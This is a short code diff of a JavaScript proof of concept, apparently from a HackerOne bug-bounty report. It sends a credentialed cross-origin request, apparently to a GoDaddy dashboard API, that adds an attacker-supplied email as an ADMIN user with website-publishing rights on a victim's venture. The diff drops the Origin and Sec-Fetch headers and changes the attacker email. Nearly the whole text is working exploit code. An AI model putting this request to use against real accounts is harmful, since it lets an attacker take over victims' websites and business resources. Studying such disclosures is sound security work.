@@ -16,12 +16,7 @@
   xhr.setRequestHeader("User-Agent", 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0');
   xhr.setRequestHeader("Accept", '*/*');
   xhr.setRequestHeader("Accept-Language", 'en-US,en;q=0.9');
-  xhr.setRequestHeader("Accept-Encoding", 'gzip, deflate, br');
   xhr.setRequestHeader("Content-Type", 'application/json');
-  xhr.setRequestHeader("Origin", 'https://dashboard.godaddy.com');
-  xhr.setRequestHeader("Sec-Fetch-Dest", 'empty');
-  xhr.setRequestHeader("Sec-Fetch-Mode", 'cors');
-  xhr.setRequestHeader("Sec-Fetch-Site", 'same-site');
 
   xhr.withCredentials = true;
 
@@ -42,7 +37,7 @@
       "website_publish"
     ],
     userName: "asdasd",
-    userEmail: "razii@wearehackerone.com",
+    userEmail: "inimail+2@wearehackerone.com",
     resourceId: resourceId,
     resourceType: "venture",
     defaultRole: "ADMIN"
